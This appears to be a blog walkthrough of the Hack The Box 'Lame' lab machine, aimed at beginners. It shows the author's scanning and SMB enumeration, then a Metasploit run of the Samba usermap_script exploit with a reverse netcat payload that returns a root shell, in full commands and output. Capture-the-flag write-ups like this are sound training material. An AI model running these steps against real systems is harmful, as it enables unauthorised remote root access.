<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Lame - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,lame,samba,network,vulnerability-assessment,common-services,outdated-software,security-tools,metasploit,remote-code-execution"><meta name=description content="The aim of this walkthrough is to provide help with the Lame machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Beginner-Track challenges.
SETUP There are a couple of ways to connect to the target machine."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/lame/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Lame - Walkthrough"><meta property="og:description" content="The aim of this walkthrough is to provide help with the Lame machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Beginner-Track challenges.
SETUP There are a couple of ways to connect to the target machine."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/lame/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-26T00:00:00+00:00"><meta property="article:modified_time" content="2023-05-26T00:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Lame - Walkthrough"><meta name=twitter:description content="The aim of this walkthrough is to provide help with the Lame machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Beginner-Track challenges.
SETUP There are a couple of ways to connect to the target machine."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Lame - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/lame/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Lame - Walkthrough","name":"HTB - Lame - Walkthrough","description":"The aim of this walkthrough is to provide help with the Lame machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Beginner-Track challenges.\nSETUP There are a couple of ways to connect to the target machine.","keywords":["htb","walkthrough","lame","samba","network","vulnerability-assessment","common-services","outdated-software","security-tools","metasploit","remote-code-execution"],"articleBody":"The aim of this walkthrough is to provide help with the Lame machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Beginner-Track challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAdditionally - even though not required - it is possible to set a local variable (only available in the current shell) containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ INFORMATION-GATHERING We start out by building our supporting file structure.\n┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame] └──╼ [★]$ mkdir 1_recon; mkdir 2_exploitation; mkdir 3_post-exploitation ┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame] └──╼ [★]$ tree . ├── 1_recon ├── 2_exploitation └── 3_post-exploitation 3 directories, 0 files ┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame] └──╼ [★]$ Once that’s done, we follow up with a quick connection check.\n┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame] └──╼ [★]$ cd 1_recon/ ┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame/1_recon] └──╼ [★]$ ping -c 4 -n -R $rhost \u003e connection-test.txt ┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame/1_recon] └──╼ [★]$ cat connection-test.txt PING 10.129.179.224 (10.129.179.224) 56(124) bytes of data. 64 bytes from 10.129.179.224: icmp_seq=1 ttl=63 time=16.5 ms RR: 10.10.14.2 10.129.0.1 10.129.179.224 10.129.179.224 10.10.14.1 10.10.14.2 64 bytes from 10.129.179.224: icmp_seq=2 ttl=63 time=11.4 ms\t(same route) 64 bytes from 10.129.179.224: icmp_seq=3 ttl=63 time=11.1 ms\t(same route) 64 bytes from 10.129.179.224: icmp_seq=4 ttl=63 time=10.9 ms\t(same route) --- 10.129.179.224 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3005ms rtt min/avg/max/mdev = 10.946/12.480/16.489/2.320 ms ┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame/1_recon] └──╼ [★]$ Since our target is already up and running, it’s time for a nice tcp SYN and all-ports scan.\n┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame/1_recon] └──╼ [★]$ nmap -Pn -sT -p- -min-rate 5000 -oN nmap-syn-allports-scan $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 00:55 BST Nmap scan report for 10.129.179.224 Host is up (0.019s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds ┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame/1_recon] └──╼ [★]$ Four ports are reported to be open. We use the default scripts and some version scanning to get more detailed information about them.\n┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame/1_recon] └──╼ [★]$ nmap -Pn -sT -sC -sV -p 21,22,139,445 -oN nmap-syn-version-script-scan $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 00:57 BST Nmap scan report for 10.129.179.224 Host is up (0.012s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.2 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA) |_ 2048 5656240f211ddea72bae61b1243de8f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 2h00m06s, deviation: 2h49m45s, median: 4s | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2023-05-25T19:58:07-04:00 |_smb2-time: Protocol negotiation failed (SMB2) | smb-security-mode: | account_used: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 52.07 seconds ┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame/1_recon] └──╼ [★]$ Some of the interesting bits we might take away from this report:\nftp anonymous login is allowed on port 21 - version vsFTPd 2.3.4 ssh version –\u003e OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) potential smb shares | 139 –\u003e older, on top of netbios (same network only!!) potential smb shares | 445 –\u003e newer, on top of tcp os: probably Ubuntu 8.04.4 LTS (Hardy Heron) Since guest login appears to be enabled, enumerating ftp looks like a perfect place to start.\n┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame/1_recon] └──╼ [★]$ ftp $rhost Connected to 10.129.179.224. 220 (vsFTPd 2.3.4) Name (10.129.179.224:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. 226 Directory send OK. ftp\u003e exit 221 Goodbye. ┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame/1_recon] └──╼ [★]$ Sadly, it looks like the share is empty. Since ftp was a bust, we continue our recon by enumerating (quite extensively) the samba shares.\n┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame/1_recon/assets-found] └──╼ [★]$ nmap -Pn --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 01:55 BST Nmap scan report for 10.129.179.224 Host is up (0.013s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-enum-users: | LAME\\backup (RID: 1068) | Full name: backup | Flags: Account disabled, Normal user account | LAME\\bin (RID: 1004) | Full name: bin | Flags: Account disabled, Normal user account | LAME\\bind (RID: 1210) | Flags: Account disabled, Normal user account | LAME\\daemon (RID: 1002) | Full name: daemon | Flags: Account disabled, Normal user account | LAME\\dhcp (RID: 1202) | Flags: Account disabled, Normal user account | LAME\\distccd (RID: 1222) | Flags: Account disabled, Normal user account | LAME\\ftp (RID: 1214) | Flags: Account disabled, Normal user account | LAME\\games (RID: 1010) | Full name: games | Flags: Account disabled, Normal user account | LAME\\gnats (RID: 1082) | Full name: Gnats Bug-Reporting System (admin) | Flags: Account disabled, Normal user account | LAME\\irc (RID: 1078) | Full name: ircd | Flags: Account disabled, Normal user account | LAME\\klog (RID: 1206) | Flags: Account disabled, Normal user account | LAME\\libuuid (RID: 1200) | Flags: Account disabled, Normal user account | LAME\\list (RID: 1076) | Full name: Mailing List Manager | Flags: Account disabled, Normal user account | LAME\\lp (RID: 1014) | Full name: lp | Flags: Account disabled, Normal user account | LAME\\mail (RID: 1016) | Full name: mail | Flags: Account disabled, Normal user account | LAME\\man (RID: 1012) | Full name: man | Flags: Account disabled, Normal user account | LAME\\msfadmin (RID: 3000) | Full name: msfadmin,,, | Flags: Normal user account | LAME\\mysql (RID: 1218) | Full name: MySQL Server,,, | Flags: Account disabled, Normal user account | LAME\\news (RID: 1018) | Full name: news | Flags: Account disabled, Normal user account | LAME\\nobody (RID: 501) | Full name: nobody | Flags: Account disabled, Normal user account | LAME\\postfix (RID: 1212) | Flags: Account disabled, Normal user account | LAME\\postgres (RID: 1216) | Full name: PostgreSQL administrator,,, | Flags: Account disabled, Normal user account | LAME\\proftpd (RID: 1226) | Flags: Account disabled, Normal user account | LAME\\proxy (RID: 1026) | Full name: proxy | Flags: Account disabled, Normal user account | LAME\\root (RID: 1000) | Full name: root | Flags: Account disabled, Normal user account | LAME\\service (RID: 3004) | Full name: ,,, | Flags: Account disabled, Normal user account | LAME\\sshd (RID: 1208) | Flags: Account disabled, Normal user account | LAME\\sync (RID: 1008) | Full name: sync | Flags: Account disabled, Normal user account | LAME\\sys (RID: 1006) | Full name: sys | Flags: Account disabled, Normal user account | LAME\\syslog (RID: 1204) | Flags: Account disabled, Normal user account | LAME\\telnetd (RID: 1224) | Flags: Account disabled, Normal user account | LAME\\tomcat55 (RID: 1220) | Flags: Account disabled, Normal user account | LAME\\user (RID: 3002) | Full name: just a user,111,, | Flags: Normal user account | LAME\\uucp (RID: 1020) | Full name: uucp | Flags: Account disabled, Normal user account | LAME\\www-data (RID: 1066) | Full name: www-data |_ Flags: Account disabled, Normal user account |_smb-enum-sessions: ERROR: Script execution failed (use -d to debug) | smb-enum-shares: | account_used: | \\\\10.129.179.224\\ADMIN$: | Type: STYPE_IPC | Comment: IPC Service (lame server (Samba 3.0.20-Debian)) | Users: 1 | Max Users: | Path: C:\\tmp | Anonymous access: | \\\\10.129.179.224\\IPC$: | Type: STYPE_IPC | Comment: IPC Service (lame server (Samba 3.0.20-Debian)) | Users: 1 | Max Users: | Path: C:\\tmp | Anonymous access: READ/WRITE | \\\\10.129.179.224\\opt: | Type: STYPE_DISKTREE | Comment: | Users: 1 | Max Users: | Path: C:\\tmp | Anonymous access: | \\\\10.129.179.224\\print$: | Type: STYPE_DISKTREE | Comment: Printer Drivers | Users: 1 | Max Users: | Path: C:\\var\\lib\\samba\\printers | Anonymous access: | \\\\10.129.179.224\\tmp: | Type: STYPE_DISKTREE | Comment: oh noes! | Users: 1 | Max Users: | Path: C:\\tmp |_ Anonymous access: READ/WRITE Nmap done: 1 IP address (1 host up) scanned in 372.12 seconds ┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame/1_recon/assets-found] └──╼ [★]$ Only two users appear to be enabled: msfadmin and user. Regarding the shares, the only one we are allowed access to is the - \\tmp - share (not counting - \\IPC$ - usually empty or unimportant).\nInterestingly enough, a quick online search reveals multiple potential attack vectors:\npossible default credentials: msfadmin:msfadmin potential msf exploit - exploit/samba/usermap_script EXPLOITATION Let’s fire up the metasploit framework console and then check out the aforementioned exploit.\n┌─[eu-dedivip-2]─[10.10.14.2]─[htb-bluewalle@htb-elmlfwe0dg]─[~/lame/1_recon/assets-found] └──╼ [★]$ msfconsole -q [msf](Jobs:0 Agents:0) \u003e\u003e use exploit/multi/samba/usermap_script [*] No payload configured, defaulting to cmd/unix/reverse_netcat [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u003e\u003e info Name: Samba \"username map script\" Command Execution Module: exploit/multi/samba/usermap_script Platform: Unix Arch: cmd Privileged: Yes License: Metasploit Framework License (BSD) Rank: Excellent Disclosed: 2007-05-14 Provided by: jduck Available targets: Id Name -- ---- =\u003e 0 Automatic Check supported: No Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://docs.metasploit.com/doc s/using-metasploit/basics/using-metasploit.html RPORT 139 yes The target port (TCP) Payload information: Space: 1024 Description: This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default \"username map script\" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication! References: https://nvd.nist.gov/vuln/detail/CVE-2007-2447 OSVDB (34700) http://www.securityfocus.com/bid/23972 http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534 http://samba.org/samba/security/CVE-2007-2447.html View the full module info with the info -d command. [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u003e\u003e Once we made sure that the script does exactly what we desire, we list it’s configuration settings.\n[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u003e\u003e show options Module options (exploit/multi/samba/usermap_script): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://docs.metasploit.com/do cs/using-metasploit/basics/using-metasploit.html RPORT 139 yes The target port (TCP) Payload options (cmd/unix/reverse_netcat): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 64.227.43.138 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u003e\u003e Two of the fields need some adjusting, namely rhosts and lhost. The first refers to our target machine ($rhost), the second one to our pwnbox (attacker machine).\n[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u003e\u003e set rhosts 10.129.179.224 rhosts =\u003e 10.129.179.224 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u003e\u003e set lhost tun0 lhost =\u003e 10.10.14.2 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u003e\u003e Since no check support is available for this particular exploit, we simply ran it after the setup is finished.\n[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u003e\u003e run [*] Started reverse TCP handler on 10.10.14.2:4444 [*] Command shell session 1 opened (10.10.14.2:4444 -\u003e 10.129.179.224:51537) at 2023-05-26 02:21:48 +0100 The exploit does run successfully and provides us with a root shell to our target.\nwhoami root But this shell connection appears to be neither stable, nor interactive, so our next course of action is to upgrade it.\nwhich python /usr/bin/python python -c 'import pty; pty.spawn(\"/bin/bash\")' root@lame:/# export TERM=xterm export TERM=xterm root@lame:/# clear clear Even though the echoing back is not turned off, it’s much more informative than before. Goofing around a bit get’s us both the user and the root flag. All that’s left for us is to simply grab them.\nroot@lame:/# cd /home/ cd /home/ root@lame:/home# ls -lag ls -lag total 24 drwxr-xr-x 6 root 4096 Mar 14 2017 . drwxr-xr-x 21 root 4096 Oct 31 2020 .. drwxr-xr-x 2 nogroup 4096 Mar 17 2010 ftp drwxr-xr-x 2 makis 4096 Mar 14 2017 makis drwxr-xr-x 2 service 4096 Apr 16 2010 service drwxr-xr-x 3 1001 4096 May 7 2010 user root@lame:/home# cd user cd user root@lame:/home/user# ls -hla ls -hla total 28K drwxr-xr-x 3 1001 1001 4.0K May 7 2010 . drwxr-xr-x 6 root root 4.0K Mar 14 2017 .. -rw------- 1 1001 1001 165 May 7 2010 .bash_history -rw-r--r-- 1 1001 1001 220 Mar 31 2010 .bash_logout -rw-r--r-- 1 1001 1001 2.9K Mar 31 2010 .bashrc -rw-r--r-- 1 1001 1001 586 Mar 31 2010 .profile drwx------ 2 1001 1001 4.0K May 7 2010 .ssh root@lame:/home/user# cd ../service cd ../service root@lame:/home/service# ls -hla ls -hla total 20K drwxr-xr-x 2 service service 4.0K Apr 16 2010 . drwxr-xr-x 6 root root 4.0K Mar 14 2017 .. -rw-r--r-- 1 service service 220 Apr 16 2010 .bash_logout -rw-r--r-- 1 service service 2.9K Apr 16 2010 .bashrc -rw-r--r-- 1 service service 586 Apr 16 2010 .profile root@lame:/home/service# cd ../makis cd ../makis root@lame:/home/makis# ls -hla ls -hla total 28K drwxr-xr-x 2 makis makis 4.0K Mar 14 2017 . drwxr-xr-x 6 root root 4.0K Mar 14 2017 .. -rw------- 1 makis makis 1.1K Mar 14 2017 .bash_history -rw-r--r-- 1 makis makis 220 Mar 14 2017 .bash_logout -rw-r--r-- 1 makis makis 2.9K Mar 14 2017 .bashrc -rw-r--r-- 1 makis makis 586 Mar 14 2017 .profile -rw-r--r-- 1 makis makis 0 Mar 14 2017 .sudo_as_admin_successful -rw-r--r-- 1 makis makis 33 May 25 19:16 user.txt root@lame:/home/makis# cat user.txt cat user.txt root@lame:/home/makis# cd /root/ cd /root/ root@lame:/root# ls -hla ls -hla total 80K drwxr-xr-x 13 root root 4.0K May 25 19:16 . drwxr-xr-x 21 root root 4.0K Oct 31 2020 .. -rw------- 1 root root 373 May 25 19:16 .Xauthority lrwxrwxrwx 1 root root 9 May 14 2012 .bash_history -\u003e /dev/null -rw-r--r-- 1 root root 2.2K Oct 20 2007 .bashrc drwx------ 3 root root 4.0K May 20 2012 .config drwx------ 2 root root 4.0K May 20 2012 .filezilla drwxr-xr-x 5 root root 4.0K May 25 19:16 .fluxbox drwx------ 2 root root 4.0K May 20 2012 .gconf drwx------ 2 root root 4.0K May 20 2012 .gconfd drwxr-xr-x 2 root root 4.0K May 20 2012 .gstreamer-0.10 drwx------ 4 root root 4.0K May 20 2012 .mozilla -rw-r--r-- 1 root root 141 Oct 20 2007 .profile drwx------ 5 root root 4.0K May 20 2012 .purple -rwx------ 1 root root 4 May 20 2012 .rhosts drwxr-xr-x 2 root root 4.0K May 20 2012 .ssh drwx------ 2 root root 4.0K May 25 19:16 .vnc drwxr-xr-x 2 root root 4.0K May 20 2012 Desktop -rwx------ 1 root root 401 May 20 2012 reset_logs.sh -rw------- 1 root root 33 May 25 19:16 root.txt -rw-r--r-- 1 root root 118 May 25 19:16 vnc.log root@lame:/root# cat root.txt cat root.txt root@lame:/root# Congratulations, we just successfully pwned the target machine. All that’s left for us to do is to simply terminate the target box (if not terminated automatically) before we continue with the next box!\n","wordCount":"2556","inLanguage":"en","datePublished":"2023-05-26T00:00:00Z","dateModified":"2023-05-26T00:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/lame/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Lame - Walkthrough</h1><div class=post-meta><span title='2023-05-26 00:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2556 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#information-gathering><strong>INFORMATION-GATHERING</strong></a></li><li><a href=#exploitation><strong>EXPLOITATION</strong></a></li></ul></nav></div></details></div><div class=post-content><p>The aim of this walkthrough is to provide help with the <strong>Lame</strong> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out complete beginners with finishing the <a href=https://app.hackthebox.com/tracks/Beginner-Track title=Beginner-Track>Beginner-Track</a> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Additionally - even though not required - it is possible to set a <strong>local</strong> variable (only available in the current <strong>shell</strong>) containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><h2 id=information-gathering><strong>INFORMATION-GATHERING</strong><a hidden class=anchor aria-hidden=true href=#information-gathering>#</a></h2><p>We start out by building our <strong>supporting file structure</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame<span class=o>]</span>
